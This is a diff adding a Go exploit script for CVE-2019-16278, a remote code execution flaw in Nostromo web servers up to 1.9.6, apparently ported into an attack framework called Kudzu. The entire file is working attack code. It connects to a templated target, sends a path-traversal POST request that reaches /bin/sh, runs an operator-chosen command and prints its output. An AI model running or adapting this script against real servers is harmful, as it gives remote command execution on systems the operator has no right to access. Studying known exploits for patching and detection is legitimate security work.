@@ -1,0 +1,49 @@
+/*{
+Name: CVE-2019-16278
+Author: sp0re
+Ported by: TerminalJockey //this is the first cve ported to Kudzu!
+Date: 3/9/2021
+Description: Remote code execution vuln in Nostromo <= 1.9.6
+Type:Web
+Options:
+{
+	"Rhost":"",
+	"Rport":"",
+	"Cmd":""
+}
+}*/
+
+
+package main
+
+import (
+	"fmt"
+	"io/ioutil"
+	"log"
+	"net"
+    "time"
+)
+
+func main() {
+	conn, err := net.Dial("tcp", "{{.Rhost}}:{{.Rport}}")
+	if err != nil {
+		log.Println(err)
+	}
+    cmd := "{{.Cmd}}"
+	pload := "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n" + cmd + " 2>&1"
+	fmt.Println(pload)
+	conn.Write([]byte(pload))
+    
+	go getresp(conn)
+    
+    //this sleep allows the request to complete without locking our console if the response fails
+    time.Sleep(2 * time.Second)
+}
+
+func getresp(conn net.Conn) {
+    resp, err := ioutil.ReadAll(conn)
+    if err != nil {
+        log.Println(err)
+    }
+    fmt.Println(string(resp))
+}
